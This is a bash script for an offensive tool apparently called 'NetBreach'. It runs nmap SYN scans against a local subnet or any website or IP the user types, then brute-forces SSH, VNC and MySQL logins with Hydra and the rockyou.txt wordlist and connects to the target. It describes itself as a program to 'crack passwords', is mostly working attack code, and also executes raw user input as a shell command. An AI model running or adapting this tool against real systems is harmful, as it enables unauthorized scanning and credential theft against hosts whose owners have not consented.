#!/bin/bash
#MANUAL GLOBAL SCRIPT
# file that hold all the variables that need for the program to work properly
source DontEdit.sh

# Function to handle cleanup on exit
# quits program with ctrl-c
EXIT_PROGRAM_WITH_CTRL_C() {
    echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

# quits program with ctrl-z
EXIT_PROGRAM_WITH_CTRL_Z(){
    echo ""
    echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
    # Add cleanup commands here
    exit 1
}

# Function to be executed when Ctrl+Z is pressed
handle_ctrl_z() {
    EXIT_PROGRAM_WITH_CTRL_Z
    exit 1
    # Your custom action goes here
}

# Set up the trap to call the function on SIGTSTP (Ctrl+Z)
trap 'handle_ctrl_z' SIGTSTP

# Function to handle Ctrl+C
ctrl_c() {
    echo ""
    EXIT_PROGRAM_WITH_CTRL_C
}

trap ctrl_c SIGINT

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check for required packages
for package in "${required_packages[@]}"; do
    if ! command_exists "$package"; then
        echo ""
        echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
        sleep 1 

        #asks the user if they want to install the packages that are mssing
        echo "Would you like me to install it for you. YES/NO"

        read -p ">>> " install
        
        if [[ " ${yes[*]} " == *" ${install} "* ]]; then
            ps aux | grep sudo
            echo "Input the PID for to kill the root session to install the packages."
            read -p ">>> " session
            kill -9 "${session}"
            bash requirements.sh
            exit 1
        else
            echo "Ok stopping program"
            exit 1
        fi
        exit 1
    fi
done

# Check if the script is run with --help or -h
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    figlet "? HELP ?"
    echo
    echo "+++++++++++++++Programs used+++++++++++++++"
    echo "This program will help you crack passwords"
    echo "It has two programs inside it, one is Hydra and the other is Nmap"
    echo
    echo "+++++++++++++++How to use++++++++++++++++++"
    echo "To use the program you have to tell the computer what port you want to scan."
    echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
    echo "If there are any ports that are open, it will ask for a username and hostname."
    echo "When you give the program the username and hostname, it will try to crack that given parameters you gave it."
    echo
else
    # Check if root user
    if [[ $EUID -ne 0 ]]; then
        echo -e "[ ${RED}FAIL${NC} ]: Please run as root."
        exit 1
    fi
    if [[ "$OSTYPE" == "${OS}"* ]]; then
        clear
        if [[ $EUID -ne "${root}" ]]; then
            # Error message if not running as root
            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
            echo -e "[ ${RED}FAIL${NC} ]: TIME:${CURRENT_TIME} Please run as ROOT. DATE:${CURRENT_DATE}"
            exit
        else
            sudo rm -rf hydra.restore
            clear

            #checks if the user is connected to the internet if they are not connceted it tells them they are not connceted and have to connect
            SITE="https://google.com/"
            if ! curl --head --silent --fail $SITE > /dev/null; then
                echo "ERROR:TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}" >> ERROR.LOG
                echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}"

                exit 1
            else
                echo ""
            fi

            # Clear the terminal
            clear

            # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
            NetBreach() {
                # The logo of the program
                figlet -f slant "NetBreach"
                figlet -f slant "Manual Global Mode"
                echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                echo "If you want to scan a website type Manual and then type the website name or ip address of the website"
                echo "If you want to stop the program type 'stop'."
                read -p ">>> " service
                
                if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
                    # Tells the user that it can take up to an hour to complete the scanning process
                    echo -e "${RED}This can take up to 1 hour to complete.${NC}"
                    
                    # Scan the entire network and display open ports
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open

                    # asks if the user want to see scan on a open file or not
                    read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                        echo "Opeing the scan file"
                        sleep 1
                        open scan.txt

                    else
                        echo -e "[ ${RED}FAIL${NC} ] Ok I will not open the scan.txt file"
                        sleep 1
                    fi
                    
                    hydra -h
                    echo "Put in Hydra first to start the script."
                    echo ""
                    read -p ">>> " Hydra

                    if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
                        echo "Goodbye"
                        exit 1
                    else
                        $Hydra
                        exit 1
                    fi
                elif [[ " ${Manual[*]} " == *" ${service} "* ]]; then
                    echo "What website would you like to scan? Or user IP"

                    #input for the website name
                    read -p ">>> " Manual_scan
                    
                    #scan a website name
                    sudo nmap -sS "${Manual_scan}" -oN "${Manual_scan}".log --open
                    read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile

                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                        open "${Manual_scan}.log"
                    else
                        echo "[-] Ok I will not open the ${Manual_scan}.log file"
                        sleep 1
                    fi
                
                
                # If the user asks what the program does, it goes to a function that helps them and explains what the program does
                elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                    echo "Stopping program..."
                    sleep 1
                    exit 1
                #checks if the user has put nothing into the input feild
                elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
                    echo -e "${RED}ERROR:${NC} plase input a number into the input field"
                    sleep 1
                    exit 1                
                #checks if the user has put in a letter insted of a number into the input feild
                for letter in "${alphabet[@]}"; do
                    if [[ "${letter}" == "${service}" ]]; then
                        echo "Please enter a number next time"
                        exit 1
                    fi
                done

                else
                    # Scan specific port
                    sudo nmap -sS 192.168.1.1/24 -p "${service}" -oN $service.log --open
                    read -p "Would you like to see the ${service} on a open file (Yes or No): " SeeFile

                    if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                        open "${service}.log"
                    else
                        echo "[-] Ok I will not open the ${service}.log file"
                        sleep 1
                    fi
                fi
            }

            RunHackingCommand() {
                # Break in the outputs of my code
                echo
                # Services to crack the network
                echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                read -p "Input Username: " user
                read -p "Input Hostname: " host
                read -p "Input Port: " port
            }

            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        NetBreach
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack VNC password
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                        # Alerts the user that the computer is trying to connect to the VNC server
                        title="Connecting to ${host}"
                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
                        echo "${title}"
                        echo "${Connecting_To_VNC_SERVER}"
                        sleep 5

                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                        # Notification for the user to see the computer is connected to the VNC server
                        title="Enter password to ${host}"
                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. To continue..."
                        echo
                        echo "${title}"
                        echo "${Connected_To_VNC_SERVER}"
                        # Put the
                        echo
                        echo "Loading VNC server..."
                        open "vnc://${host}"
                        exit
                    fi
                fi
            }

            RunHackingCommandWithSSH() {
                if [[ $service == 22 || $service == "ssh" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        NetBreach
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else

                        # Crack SSH password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                        # Alerts the user that the computer is trying to connect to the ssh server
                        title="Connecting to ${user}"
                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
                        echo ""
                        echo "${title}"
                        echo "${Connecting_To_SSH_SERVER}"
                        sleep 5

                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                        echo ""
                        title="Enter password to ${user}"
                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                        echo "${title}"
                        echo "${Connected_To_SSH_SERVER}"
                        echo ""
                        ssh "${user}@${host}" -p "${port}"
                    fi
                fi
            }

            RunHackingCommandWithMySQL() {
                if [[ $service == 3306 || $service == "mysql" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        NetBreach
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack MySQL password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                        echo "Loading MySQL server..."
                        sleep 3
                        mysql -u $user -p -A
                    fi
                fi
            }

            NetBreach # Calls the NetBreach function

            RunHackingCommand # Calls the RunHackingCommand function

            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function

            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
        fi
    else
        clear
        # Warning message for wrong OS
        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
    fi
fi